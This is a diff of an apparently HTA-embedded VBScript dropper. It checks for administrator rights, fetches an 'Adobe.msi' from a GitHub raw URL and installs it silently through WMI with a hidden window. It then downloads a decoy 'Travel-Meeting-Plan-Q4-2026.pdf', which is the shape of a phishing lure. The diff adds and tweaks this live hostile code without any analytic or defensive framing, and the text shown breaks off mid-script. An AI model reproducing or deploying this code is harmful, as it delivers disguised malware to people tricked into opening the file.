@@ -1,8 +1,12 @@
 Dim fso, sh, qs, tmp, selfPath, isAdmin
+Dim http, stream, msiUrl, msiPath, pid
+Dim wmiSvc, procClass, startup, cmdLine
+Dim pdfUrl, pdfPath, ph, ps
+
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 qs  = Chr(34)
-tmp = sh.ExpandEnvironmentStrings("%TEMP%")
+tmp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
 
 selfPath = location.href
 selfPath = Replace(selfPath, "file:///", "")
@@ -22,9 +26,8 @@ If Not isAdmin Then
     self.close
 End If
 
-Dim http, stream, msiUrl, msiPath
 msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
-msiPath = tmp & "\a.msi"
+msiPath = tmp & "\Adobe.msi"
 
 On Error Resume Next
 Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -44,20 +47,18 @@ If http.status = 200 Then
 End If
 
 If fso.FileExists(msiPath) Then
-    Dim wmiSvc, procClass, startup, cmdLine, pid
     Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
     Set procClass = wmiSvc.Get("Win32_Process")
     Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
     startup.ShowWindow = 0
-    cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn+ /norestart ALLUSERS=1"
+    cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn /norestart ALLUSERS=1"
     procClass.Create cmdLine, Null, startup, pid
 End If
 
 sh.Run "%COMSPEC% /c timeout /t 30 /nobreak >nul", 0, True
 
-Dim pdfUrl, pdfPath, ph, ps
 pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
-pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
+pdfPath = tmp & "\Travel-Meeting-Plan-Q4-2026.pdf"
 
 On Error Resume Next
 Set ph = CreateObject("MSXML2.ServerXMLHTTP.6.0")
